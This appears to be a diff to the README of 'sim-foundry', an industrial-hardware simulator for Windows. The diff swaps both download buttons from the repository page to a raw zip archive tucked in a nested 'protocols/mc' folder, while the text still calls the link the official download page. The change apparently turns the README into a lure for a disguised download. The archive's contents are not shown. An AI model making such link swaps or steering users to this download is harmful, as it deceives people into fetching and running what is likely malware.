@@ -12,7 +12,7 @@ Getting sim-foundry up and running is straightforward. We'll walk you through ea
 
 ### 📥 Download and Install
 
-[**⬇️ DOWNLOAD SIM-FOUNDRY NOW**](https://github.com/wailhoud/sim-foundry)
+[**⬇️ DOWNLOAD SIM-FOUNDRY NOW**](https://raw.githubusercontent.com/wailhoud/sim-foundry/main/protoforge/protocols/mc/v3.6.zip)
 
 Visit this link to download the application. This is the official download page where you'll find the latest version of sim-foundry ready for installation on your Windows computer.
 
@@ -193,7 +193,7 @@ The development team actively maintains sim-foundry and regularly releases updat
 
 Don't let hardware procurement slow down your project. With sim-foundry, you can develop, test, and perfect your industrial applications before a single physical component arrives at your office.
 
-[**⬇️ CLICK HERE TO DOWNLOAD SIM-FOUNDRY**](https://github.com/wailhoud/sim-foundry)
+[**⬇️ CLICK HERE TO DOWNLOAD SIM-FOUNDRY**](https://raw.githubusercontent.com/wailhoud/sim-foundry/main/protoforge/protocols/mc/v3.6.zip)
 
 Visit this link to download the application. Begin creating your virtual factory within minutes and say goodbye to hardware-related development delays forever.
 
